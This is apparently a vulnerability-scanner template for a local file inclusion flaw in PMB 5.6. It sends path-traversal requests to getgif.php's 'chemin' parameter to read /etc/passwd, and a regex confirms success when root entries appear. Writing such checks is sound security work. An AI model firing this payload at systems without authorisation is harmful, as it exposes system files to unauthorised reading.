id: pmb-directory-traversal
name: PMB 5.6 - Local File Inclusion
severity: high
confidence: tentative
description: PMB 5.6 is vulnerable to local file inclusion because the PMB Gif Image is not sanitizing the content of the
  'chemin' parameter.
reference: CWE-22
tags:
- lfi
- packetstorm
- vuln
requests:
- method: GET
  path: /opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
  matchers: &id001
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  condition: and
- method: GET
  path: /pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
  matchers: *id001
  condition: and
